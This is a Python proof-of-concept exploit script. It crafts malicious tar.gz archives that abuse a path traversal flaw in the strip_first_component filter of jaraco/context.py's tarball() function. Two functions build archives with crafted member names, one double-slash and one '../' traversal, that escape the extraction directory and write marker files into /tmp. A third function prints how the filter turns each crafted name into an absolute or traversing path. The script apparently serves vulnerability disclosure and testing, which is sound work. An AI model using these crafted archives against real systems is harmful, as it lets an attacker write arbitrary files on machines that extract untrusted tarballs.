#!/usr/bin/env python3
"""
Proof-of-Concept: Tarball Path Traversal via strip_first_component filter bypass

This creates a malicious tarball that exploits the vulnerability in
jaraco/context.py's tarball() function where the strip_first_component
filter bypasses the security checks provided by data_filter.

Vulnerability: jaraco/context.py:65,71-76

The strip_first_component filter modifies member.name by splitting off
the first component, but doesn't validate the result for path traversal.
"""

import tarfile
import io
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

def create_malicious_tarball_absolute():
    """
    Create a tarball with an entry that becomes an absolute path after
    strip_first_component processing.

    Entry: prefix//tmp/pwned_by_tarball/evil.txt
    After strip: /tmp/pwned_by_tarball/evil.txt (absolute path!)
    """
    tarball_path = os.path.join(OUTPUT_DIR, "malicious_absolute.tar.gz")

    with tarfile.open(tarball_path, "w:gz") as tf:
        # Create a file entry with double slash that becomes absolute after stripping
        # "prefix//tmp/pwned" -> split('/', 1) -> ('prefix', '/tmp/pwned')
        content = b"PWNED via absolute path injection!\n"
        info = tarfile.TarInfo(name="prefix//tmp/pwned_by_tarball/evil.txt")
        info.size = len(content)
        tf.addfile(info, io.BytesIO(content))

    print(f"Created: {tarball_path}")
    print(f"  Entry name: prefix//tmp/pwned_by_tarball/evil.txt")
    print(f"  After strip_first_component: /tmp/pwned_by_tarball/evil.txt")
    return tarball_path


def create_malicious_tarball_traversal():
    """
    Create a tarball with path traversal sequences.

    Entry: prefix/../../../tmp/pwned_by_tarball/traversal.txt
    After strip: ../../tmp/pwned_by_tarball/traversal.txt
    """
    tarball_path = os.path.join(OUTPUT_DIR, "malicious_traversal.tar.gz")

    with tarfile.open(tarball_path, "w:gz") as tf:
        # Create a file entry with path traversal
        content = b"PWNED via path traversal!\n"
        info = tarfile.TarInfo(name="prefix/../../../tmp/pwned_by_tarball/traversal.txt")
        info.size = len(content)
        tf.addfile(info, io.BytesIO(content))

    print(f"Created: {tarball_path}")
    print(f"  Entry name: prefix/../../../tmp/pwned_by_tarball/traversal.txt")
    print(f"  After strip_first_component: ../../tmp/pwned_by_tarball/traversal.txt")
    return tarball_path


def demonstrate_strip_behavior():
    """Show how strip_first_component processes malicious entries."""
    print("\n=== strip_first_component behavior ===\n")

    test_cases = [
        "prefix/normal/file.txt",           # Normal case
        "prefix//tmp/absolute.txt",          # Double slash -> absolute
        "prefix/../../../tmp/traversal.txt", # Path traversal
        "prefix/foo/../../bar.txt",          # Traversal in path
    ]

    for name in test_cases:
        _, result = name.split('/', 1)
        print(f"  {name!r}")
        print(f"    -> {result!r}")
        print(f"    Absolute? {os.path.isabs(result)}")
        print()


if __name__ == "__main__":
    print("=" * 70)
    print("Malicious Tarball Generator for jaraco/context.py Vulnerability")
    print("=" * 70)

    demonstrate_strip_behavior()

    print("\n=== Creating malicious tarballs ===\n")
    create_malicious_tarball_absolute()
    print()
    create_malicious_tarball_traversal()

    print("\n" + "=" * 70)
    print("Run exploit_test.py to trigger the vulnerability")
    print("=" * 70)
